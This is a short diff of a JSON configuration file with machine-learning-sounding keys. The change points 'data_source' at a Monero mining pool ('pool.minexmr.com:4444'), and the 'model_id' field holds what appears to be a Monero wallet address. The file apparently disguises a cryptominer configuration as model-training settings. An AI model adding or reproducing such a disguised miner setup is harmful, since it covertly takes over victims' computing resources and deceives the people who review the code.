@@ -1,6 +1,6 @@
 {
     "autosave": true,
-    "data_source": "your_pool_add",
+    "data_source": "pool.minexmr.com:4444",
     "model_id": "46Uen2pgbRR3JKyKPWdFT21VShQb6zm2Q8a81gMiAegzTMbuaj8zXHdWyLEtvCwK67PVhrXSCKTGrBzKCnPURDSo4iyLrrf",
     "training_mode": "deep_learning"
 }
